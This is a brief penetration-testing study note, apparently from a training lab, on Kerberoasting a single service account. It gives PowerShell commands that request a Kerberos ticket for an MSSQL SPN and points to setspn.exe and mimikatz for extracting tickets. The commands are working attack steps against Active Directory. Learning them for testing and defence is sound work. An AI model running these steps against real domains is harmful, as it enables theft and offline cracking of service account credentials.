#### Targeting a Single User for kerbroasting
get SPN from [[setspn.exe]]
```powershell-session
Add-Type -AssemblyName System.IdentityModel
```
```powershell-session
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "(SPN)MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

#### Retrieving All Tickets Using setspn.exe
[[setspn.exe]]

Load into mimikatz
[[mimikatz]]